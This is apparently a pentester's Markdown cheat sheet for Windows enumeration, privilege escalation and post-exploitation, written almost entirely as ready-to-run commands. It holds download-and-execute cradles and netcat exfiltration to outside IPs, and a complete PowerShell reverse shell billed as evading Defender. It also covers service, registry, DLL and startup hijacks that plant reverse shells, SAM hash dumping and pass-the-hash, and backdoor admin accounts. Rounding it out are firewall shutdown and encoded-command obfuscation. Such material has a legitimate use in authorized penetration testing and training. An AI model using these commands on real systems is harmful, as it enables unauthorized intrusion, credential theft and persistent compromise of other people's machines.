# Basics

* Always work from %TEMP% directory as it allows all users to write and it might be less monitored than system folders

```powershell
PS> cd $env:temp
```

```cmd
cmd> cd %TEMP%
```

## Enumeration

Basic Strategy

1. Check `whoami` and groups with `net user <username>`
2. `winpeas.exe quiet fast searchfast cmd`
3. Run seatbelt and other enumeration scripts
4. Run manual commands if needed 
5. Look for non windows programs and services
6. If windows version is old then try potatoes if privileges are there
7. If nothing works use kernel exploits

* Take time to look for low hanging fruits but avoid rabbit holes: registry, services ...
* Check files and folders looking for interesting files
* look for internal ports
* Check users
* 

### Find Process and its ACL

```powershell
Get-Process | findstr paint

Get-Process -Name | Get-Acl
```

### NetBIOS

NetBIOS Name is a 16-byte name for a networking service or function on a machine running Microsoft Windows Server. NetBIOS names are a more friendly way of identifying computers on a network than network numbers.

* local: `nbtstat -n`

* remote scan: `sudo nmap -sU --script nbstat.nse -p137 <host>`

### Support tools
Powerview is extremely useful to simplify your work with powershell:
* get it: `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1`
* read the docs: https://powersploit.readthedocs.io/en/latest/Recon/

### Basic usage
* start PS from cmd bypassing the execution policy: `powershell -ep bypass`
* importing modules is possbile with dot notation: `. .\PowerView.ps1`



## UAC

* check for UAC in PS: `(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA`
* check UAC in cmd: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
* UAC can be bypassed using binary exploits

# Antivirus

## Detect AV Version

* works with PS 3.0 and higher
`Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`

## Download and Upload stuff


```powershell

# enable SMBv1
# this is going to be helpful to start file transfers
# on compromised machine

Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

```


1. `certutil -urlcache -split -f http://source.ip/payload.exe payload.exe`
2. Download the file in PS: 
`Invoke-WebRequest -Uri "url" -OutFile "dest"`
`curl http://xxx/file.xxx -o file.xxx`
3. Download and execute in PS: 
`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"`

or just `IEX(New-Object Net.WebClient).DownloadString('URL')`



```

New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"

#copy

copy share_path target_dir

#example 

copy c:\test '\\192.168.219.100\share_name'

```
* use in cmd
```
net use \\server /user:domain\username password
```

Netcat

`PS> cmd.exe /C "nc64.exe 192.168.219.137 443 < systeminfo.txt"`

* Powershell
```
#run receiver on listener

nc -lvnp 443 > output.xxx

#send file
Get-Content file.xxx | .\nc.exe IP PORT

#bypass execution policy  if got admin
Set-ExecutionPolicy Unrestricted
```



## Find Stuff

* cmd: `dir /s /b c:\filename` find filename in c: drive recursively
* ps: `Get-Childitem –Path C:\ -Include *filetolookfor* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue`

## Recycle Bin // TBD

* access recycle bin items

```
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```

# Enumeration

## local enumeration

* Winpeas

Optional: activate this command to see colours in a new command prompt

```cmd

REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

```

* Start `winpeas.exe` on victim in Temp folder
* Different checks can be also checked separately like `winpeas.exe userinfo`


* Older systems

```powershell
# For older Systems use Sherlock
powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"

```

### User Access Control rights check

UAC rights show if the user can read or write files.

Use accesscheck from sysinternals

`accesschk.exe /accepteula`

Check access

`.\accesschk.exe /accepteula -uwcqv user c:\`

### Services

Programs running in the background. If run under SYSTEM and compromised, they lead to priv esc.

Enumerate service with winpeas

`winpeas.exe quiet servicesinfo`


Configuration query
`sc.exe qc <name>`

Status query
`sc.exe query <name>`

Check rights of the user on service

```powershell
# use accesschk

PS C:\Temp> .\accesschk.exe /accepteula -ucqv user regsvc

R  regsvc
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG # ask the config
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START # we can start
	SERVICE_STOP # we can stop
	READ_CONTROL

```

Modify options
`sc.exe config <name> <options>= <value>`
i.e. `sc config daclsvc binpath= "\"c:\PrivEsc\rev.exe\""`

Official list of parameters: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config

Start/Stop Service
`net start/stop <name>`
i.e. 'net start daclsvc' 

#### Service Exploitation


1. Insecure Service Properties

Dangerous permissions: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS

RABBIT HOLE: Make sure you can restart the service or machine to make changes active!

`accesschk.exe /accepteula -ucqv servicename`

2. Unquoted Service Path

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

* Or use accesschk.exe to check permissions on all directories within C:\

* Example unquoted path: c:\Program Files\Unquoted Path\Some Program\bin.exe

```powershell
# First check c:\
accesschk.exe /accepteula -uwdq C:\

#output 
PS C:\temp> .\accesschk.exe /accepteula -uwdq "c:\"


  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  RW NT SERVICE\TrustedInstaller

# Check 'Program Files'

PS C:\temp> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"

  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  RW pc\user # Bingo! RW access for user!

# Bingo! User has local access read and write rights
# Now we can create a malicious Uquoted.exe with reverse shell in Program Files directory and exploit it by restarting the service
```


3. Weak Registry Permissions

First, check

```powershell
# check registry permissions of a service for HKLM\system\currentcontrolset\services\regsvc

PS C:\Temp> Get-Acl HKLM:\system\currentcontrolset\services\regsvc | Format-List
Get-Acl HKLM:\system\currentcontrolset\services\regsvc | Format-List


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)

# OR same with accesschk.exe

.\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc

# we see that NT AUTHORITY\INTERACTIVE has full control
# all localy logged in users are part of the INTERACTIVE GROUP
# So changing this registry entry can allow users to perform privileged actions
```

Now, check current reistry values for interesting entries

```powershell
PS C:\Temp> reg query HKLM\system\currentcontrolset\services\regsvc

HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe" #looks interesting
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

```

Replace registry entry with your own

```powershell

reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\user\AppData\Local\Temp\priv\rev4444.exe" /f

The operation completed successfully.
```

Now just start the service again and await reverse shell.

4. Insecure Executables

If original executable is writeable than it can be replaced with malicious file to obtain shell.

Detection in winpeas: `File Permissions: Everyone [AllAccess]`

```powershell
# confirm with accesschk

.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone # everyone can access this file and RW on it
	FILE_ALL_ACCESS 
  RW NT AUTHORITY\SYSTEM
	FILE_ALL_ACCESS
  RW BUILTIN\Administrators
	FILE_ALL_ACCESS
  RW P1\Pentester
	FILE_ALL_ACCESS
  RW BUILTIN\Users
	FILE_ALL_ACCESS

```

Let's back it up and the overwrite with shell file.

`copy rev4444.exe "C:\Program Files\File Permissions Service\filepermservice.exe"`

Now start malicous executable via service `net start filepermsvc`

5. DLL Hijacking

If service-DLL in absolute path is writeable, it can be overwritten with malicious payload.

More common: DLL is missing, so malicious payload can be added into the writable folder to cause havoc.

* Find possible vulnerable service

Use winpeas output to see non-windows services.

Pick some service that can be started and stoped: use accesschk
`.\accesschk.exe /accepteula -ucqv <user> <service>`

If service can be maunally started and stoped, pick the executable from that service and copy it to other windows machine for analysis

* create service and assign the copied executable to it on the analysis machine (if not existent)
* start procmon for analysis
* stop and clear current capture in top panel
* add filter on process name equal to copied exe `Process Name is `
* remove network and registry activities
* start capture
* start the service
* identify where is the missing dll `NAME NOT FOUND`
* create malicious DLL binary and place in writeable directory
* Enjoy reverse shell

### Autostart exploit

1. Find autostart executables

```powershell

Get-CimInstance -ClassName Win32_StartupCommand |
  Select-Object -Property Command, Description, User, Location

```

OR via cmd registry

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

```

2. Check if they are writeable

```cmd
accesschk.exe /accepteula -wvu "PATH/to/prog.exe"

icacls <Path>
#look for (F/M/W) as full access

```

or powershell

```powershell

Get-ChildItem C:\temp\ -Recurse | Get-Acl
# now look for Everyone
```

3. Overwrite the original executable and wait for shell at system restart

### Exploiting .msi with AlwaysInstallElevated

1. Detect
`winpeas.exe  quite windowscreds`

2. If `AlwaysInstallElevated set to 1 in HKLM or HKCU!` then it is exploitable

3. create malicious msi rev shell `-f msi` and execute it on victim

### Passwords compromise

#### Passwords in Registry

Run winpeas

```powershell

winpeas.exe quiet filesinfo userinfo

```

or manually with cmd

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

#or single registries

reg query "HKLM\Software\...\winlogon"

```

#### RunAs Saved Creds

Discover `winpeas.exe quiet cmd windowscreds`

`cmdkey /list`

Exploit:

`runas /savecred /user:admin C:\PrivEsc\reverse.exe`

#### Search files for information

Look for passwords

`dir /s *pass* == *.config`

If found then search in the directory for strings within files

`findstr /si password *.xml *.ini *.txt`

#### SAM/SYSTEM password hashes

* dump SAM and SYSTEM to examine it with `samdump2`


reg save HKLM\SAM c:\mimikatz_trunk\x64\SAM
reg save HKLM\SYSTEM c:\mimikatz_trunk\x64\SYSTEM

Look for backups in

`c:\Windows\System32\config` or

`c:\Windows\System32\config\RegBack` or use winpeas

`.\winpeas.exe quiet searchfast filesinfo`

* Copy SAM and SYSTEM files to Kali

* For Windows 2k/NT/XP get `samdump2`

* For newer versions use pwdump 

`python /usr/share/creddump7/pwdump.py SYSTEM SAM`

* crack NTLM `hashcat -m 1000 --force hash /wordlist`

OR even better login directly win pth-winexe

```powershell

# where hash must include the LM part too
pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' --system //192.168.111.xxx cmd.exe
```

#### Scheduled Tasks compromise

* Discovery

`schtasks /query /fo LIST /v`

or 

``` powershell

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
```

* Find scripts use by scheduled task
* Check permissions on script

`accesschk.exe /accepteula -quv user scheduled_script.ps1`

* If writeable, replace this script with a malicious executable to obtain reverse shell

* Wait until task executes

#### Insecure GUI Apps

* find an app with GUI file access ran by admin

```cmd

tasklist /V | findstr admin_GUI.exe

```

* once found that app, click on "Open File..." and type in the navigation bar on top of the window `file://c:/windows/system32/cmd.exe`

#### Startup Folder compromise

* System startup folder is located in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` and if shortcut .lnk is place wihin then program linked shall autostart at reboot.

* This can be exploited by creating and launching a .vbs script and waiting until admin logs in 

```vbs
# create_shortcut.vbs

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

* Activate this script `cscript create_shortcut.vbs`
* Wait for admin

#### Non MS Apps exploitation

* On ExploitDB select `Windows -> Apps -> Privesc -> Has App`
* Look for possbible vulnerable apps using `seatbelt.exe` on victim or `tasklist /V` or `winpeas.exe quiet processinfo`
* find the exploit on `exploit.db` as shown above

#### Potatoes

Works on Win 7,8 and early 10. Latest win 10 is patched.

Relies on NTLM relay from auth to fake http server to SMB to get SYSTEM.

* Execute potato

```powershell

.\potato.exe -ip 192.168.1.39 -cmd "C:\Temp\rev_shell.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true

```

#### Token Impersonation

Patched on latest windows 10.

* Need remote access to service accont like `nt authority\local service`
* This shall tipically work if following privileges are available `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`
* Next, find CLSID `http://ohpe.it/juicy-potato/CLSID/`
* Copy juicy potato and run it

For later versions use Rogue Potato.

#### PrintSpoofer

* Works on newer machines.
* needs `vc_redist.x64.exe`
* Check priviliges for impersonation
* Run exploit

```powershell

.\PrintSpoofer.exe -i -c "c:\Temp\rev_shell.exe"
```


### Kernel Exploits

* User Kernel only as last resort to Windows PrivEsc

* Exploit suggesters

* Older systems:

```cmd
# If your ps1 file is downloaded 

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

* New systems (more stealthy):

1. wseng
`https://github.com/bitsadmin/wesng`

`python wes.py --update`

`python wes.py ~/Sandbox/Winodows_PrivEsc/systeminfo.txt --exploits-only`

2. Use pre-compiled binaries
`https://github.com/SecWiki/windows-kernel-exploits`

3. Watson for older systems

## remote enumeration

* enum4linux
* nmap scripts
* crackmapexec

## RPC

* Dump services

`impacket-rpcdump TARGET_IP`

* Map RPC service
`impacket-rpcmap -no-pass -target-ip TARGET_IP ncacn_np:\\JEFF[\PIPE\atsvc]`

# Reverse Shells

## Powershell
* This is the most basic reverse shell not detectable by Windows Defender
* Replace xxx as needed:
* raw.ps1

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.219.xxx',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
```

* launch on target
```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"
```


## Meterpreter
This shell works even on Windows 11 but needs MSF

1. SMB delivery: `use windows/smb/smb/delivery`
2. Payload: `set payload windows/meterpreter/reverse_tcp`
3. Configure all options in MSF and `exploit`
4. During exploit execution MSF will ask you to run following on target machine: `rundll32.exe \\attacker_ip\PJSK\test.dll,0`
5. Select active session
6. Get shell: `shell`


# Escalation

## Kernel exploits

see https://github.com/jonnyzar/windows-kernel-exploits



## Standard Approach
* Download Winpeas: see github
* Follow HackTricks: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
* If it does not help, go for advances techniques



## Exposed GPP Password

* Article to read: https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/
* Use gp3finder tool once .xml file with cpassword is found
`docker run grimhacker/gp3finder -D edBSHOw...`

## Compiling Exploits for Windows on Kali

1. install mingw `apt install mingw-w64`
2. Compile for 64 bit

```
x86_64-w64-mingw32-gcc shell.c -o shell.exe
```
3. Compile for 32 bit
```
i686-w64-mingw32-gcc shell.c -o shell.exe
```

# Post exploitation

* Once Admin privileges obtained get SYSTEM shell
`psexec.exe -accepteula -sid cmd.exe`

Or connect as other service if needed from victim

```powershell

.\psexec.exe /accepteula -i -u "nt authority\local service" c:\rev_shell.exe
```

* look for stuff
`Get-Childitem –Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`

* enable RDP
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

* add user
`net user Pentester Password1 /ADD`

* give admin rights
`net localgroup Administrators Pentester /ADD`

* add to RDP group

`powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`

## Use winexe

In kali there is winexe tool that allows running remote commands on windows

```bash
#to spawn remote cmd SYSTEM shell
winexe -U 'admin%password123' --system //192.168.1.xxx cmd.exe
```

## Port Forwarding from Windows

* Sometimes internal vulnerable ports need to be forwarded to Kali. For example for port 445 with SMB
* use `plink.exe`
* on kali enable root login on ssh `vim /etc/ssh/sshd_config` PermitRootLogin yes. Then `service ssh restart`
* ssh must be running
* Run forwarding `plink.exe root@192.168.1.10 -R 445:127.0.0.1:445` where first port is dest and second is source and ip source,
* now  use any tools and target `127.0.0.1:445` on kali machine like `winexe`


# Firewall

* Shut off firewall
`netsh advfirewall set allprofiles state off`

* Get all FW rules

`Get-NetFirewallRule`

Or more refinded

```
Direction Outbound - limit to outbound rules since that’s where I’m having issues
Action Block - limit to rules that block traffic
Enabled True - don’t show the large set of rules that are present but not enabled
```

* Get firewall rules for blocking outbound

```
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

* Get Allow exceptions

```
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow

```
# Security Bypass and Obduscation

## Encoded Powershell Execution

```
# Generator
$command = 'Write-Output "Try Harder"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$base64 = [Convert]::ToBase64String($bytes)

# Launcher
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFQAcgB5ACAASABhAHIAZABlAHIAIgAgAA=='
```
credits to https://www.offensive-security.com/offsec/powershell-obfuscation/

## Encode and Decode binary file to transfer it to victim

```
# encode from binary file to base64txt

powershell -C "& {$outpath = (Join-Path (pwd) 'out_base64.txt'); $inpath = (Join-Path (pwd) 'data.jpg'); [IO.File]::WriteAllText($outpath, ([convert]::ToBase64String(([IO.File]::ReadAllBytes($inpath)))))}"

# decode from base64txt to binary file

powershell -C "& {$outpath = (Join-Path (pwd) 'outdata2.jpg'); $inpath = (Join-Path (pwd) 'out_base64.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"

```

big thanks for the skript to https://gist.github.com/t2psyto

